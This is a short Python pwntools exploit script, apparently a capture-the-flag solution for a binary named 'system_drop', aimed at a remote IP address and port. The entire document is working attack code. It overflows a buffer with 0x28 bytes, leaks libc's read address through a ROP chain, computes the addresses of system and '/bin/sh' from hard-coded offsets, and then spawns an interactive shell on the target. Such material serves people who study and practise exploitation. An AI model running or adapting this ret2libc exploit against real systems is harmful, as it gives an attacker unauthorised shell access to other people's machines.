# libc6_2.27-3ubuntu1.4_amd64 

from pwn import *

if __name__ == "__main__":
    io = remote("138.68.178.10", 31949)
    #io = process("./system_drop")

    pop_rdi = p64(0x004005d3)
    pop_rsi_pop_r15 = p64(0x004005d1)
    read_got = p64(0x00601020)
    syscall = p64(0x0040053b)
    main = p64(0x00400541)

    # offset relative to read address in libc
    bin_sh_offset = 0xa3cda
    system_offset = -0xc0bf0

    payload = b"A" * 0x28
    payload += pop_rdi
    payload += p64(1)
    payload += pop_rsi_pop_r15
    payload += read_got
    payload += p64(0)
    payload += syscall
    payload += main
    
    io.sendline(payload)
    res = io.recv(256)
    read_libc = u64(res[:8])
    bin_sh = p64(read_libc + bin_sh_offset)
    system = p64(read_libc + system_offset)

    payload = b"A" * 0x28
    payload += pop_rdi
    payload += bin_sh
    payload += system

    io.sendline(payload)
    io.interactive()
    io.close() 
